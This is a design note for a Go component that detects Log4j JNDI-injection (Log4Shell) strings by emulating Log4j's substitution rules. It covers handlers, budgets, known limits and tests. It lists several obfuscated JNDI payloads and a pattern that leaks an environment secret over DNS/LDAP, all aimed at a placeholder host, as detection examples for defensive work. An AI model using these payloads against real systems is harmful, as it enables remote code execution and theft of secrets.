# Lookup resolver (Step 1c)

`engine.Resolve` answers one question about a decoded string: does it make
Log4j perform a JNDI lookup, however that is spelled? It is a small emulator of
Log4j's substitution (`StrSubstitutor` and `Interpolator`), not a pattern match.

## What Log4j does, and what we reproduce

1. Find `${`, then its matching `}`, counting nested `${`.
2. Substitute everything inside, innermost first, to get the full *name*.
3. Split the name at the **first** `:-` into a variable name and a default.
4. Split the variable name at the **first** `:` into a prefix and a key. The
   prefix is lower-cased (Java `toLowerCase(Locale.US)`) and looked up.
5. If the handler returns nothing, use the default; if there is no default,
   leave the text as it was.
6. Re-scan the replacement text for further `${`.

Because step 2 happens before step 4, these all become `jndi:` and are detected:

```
${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://x.invalid/a}
${${::-j}${::-n}${::-d}${::-i}:ldap://x.invalid/a}
${${env:NaN:-j}ndi:ldap://x.invalid/a}
${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://x.invalid/a}
${jnd${upper:<dotless i>}:ldap://x.invalid/a}
```

The last one matters: Java upper-cases dotless i to ASCII `I`, so a filter that
only looks at ASCII letters misses it. `casefold.go` reproduces the Java case
mappings that differ from Go's, including the characters that expand
(for example sharp s to `SS`, or dotted capital I to `i` plus a combining dot).

## Handlers

| Prefix | Modeled as |
|---|---|
| `jndi` | A finding. Its result is treated as unknown. |
| `lower`, `upper` | Java case mapping of the key. |
| `date` | Quoted text is literal (`'j'` gives `j`); unquoted pattern letters give unknown text; an invalid letter or unterminated quote makes Java throw, so the lookup is unresolved. |
| `env`, `sys`, `java`, `ctx`, `main`, `bundle`, `map`, `sd`, `event`, `marker`, `log4j`, `web`, `docker`, `kubernetes`, `spring`, `jvmrunargs` | Environment-dependent. The result is the default if one is given, otherwise an unknown marker. They are always recorded as a possible *source* of data. |
| anything else, or no prefix | Unresolved: the default if given, otherwise the original text is kept. |

## Unknowns and the two finding tiers

Text that depends on the environment cannot be known statically, so it is
carried as an unknown marker (U+FFFF; any real U+FFFF in the input is replaced
first so it cannot be spoofed).

- `FindingJNDI`: the prefix resolves to exactly `jndi`.
- `FindingPossibleJNDI`: the prefix would be `jndi` for some value of an
  unknown (for example `${${env:X}ndi:...}`). At least two literal characters
  must be present, so a prefix made only of unknowns does not match.

`${env:X:-j}` is resolved to its default `j`, which is what an attacker relies
on when they pick a variable that is not set. If the variable is set, the
exploit simply fails; flagging it is still correct.

## Data exfiltration

`Finding.KeyLookups` lists environment-dependent lookups nested inside the JNDI
key, for example `${jndi:ldap://${env:SECRET}.x.invalid/a}`. That pattern leaks
a value over DNS or LDAP with no code execution, so rules in 1d treat it as a
distinct, serious signal.

## Deliberately conservative

| Log4j does | LogShield does | Why |
|---|---|---|
| Treats `$${` as an escaped literal | Analyzes the inner lookup anyway | A later pass elsewhere in the pipeline may expand it |
| Ignores an unterminated `${` | Analyzes it as if closed at the end of the text | The application may append a `}` before logging; marked `Unterminated` |
| Case-folds with the JVM locale | Assumes a non-Turkic locale | Documented limit |

## Budgets (fail-closed)

| Limit | Default | Exhaustion |
|---|---|---|
| `MaxNesting` | 16 | `nesting`; the parser is iterative, so a megabyte of `${` cannot overflow the stack |
| `MaxLookups` | 2048 | `lookups`, counting re-expansion of results |
| `MaxValueBytes` | 32 KiB | `value-bytes`, for any name or computed value |

Plain placeholders such as `${name}` (no colon, no nesting) are folded back into
literal text and do not count, so shell scripts and JavaScript template strings
do not exhaust the budget. Any exhaustion sets `Resolution.Exhausted`, and the
caller must block.

## Reading the output

- `Findings` is what rules act on. `Key` is attacker-controlled and truncated to
  256 bytes: defang it before logging.
- `Lookups` lists every non-trivial lookup, so rules can also flag
  environment-dependent lookups that are not JNDI.
- `MaxNesting` and `Total` feed the recursion-DoS rule (CVE-2021-45105) in 1d.
- `Finding.Expanded` means the offset is relative to lookup-generated text.

## Known limits

- Lookups defined in an application's own Log4j configuration (properties, ctx
  values filled from other requests, CVE-2021-45046) are outside what a request
  scanner can see.
- Behavior of newer Log4j releases that restrict lookups is not modeled; the
  resolver follows the permissive 2.14-era behavior, which is the safe direction
  for a virtual patch.
- Only the Java full case mappings that can yield ASCII-relevant results are
  reproduced.

## Measured cost

On the development machine (2 vCPU, Go 1.24): a header with no lookup takes
about 37 ns with no allocation; a plain exploit about 0.55 us; a fully
obfuscated exploit about 3.3 us; 64 KiB of template-heavy text about 0.4 ms. The
engine is far inside the 5 ms latency target; the budget bounds the adversarial
worst case.

## Tests

- A cross-product matrix builds the prefix and the scheme from every combination
  of 13 per-character encoders (28,561 payloads) and requires each to be found
  with the right scheme and key.
- A benign set (shell, JavaScript, placeholders, near-misses, dotless i) must
  produce no findings.
- Wrapping a payload in arbitrary surrounding text must never hide it.
- `FuzzResolve` asserts offsets, caps, determinism and budget invariants.
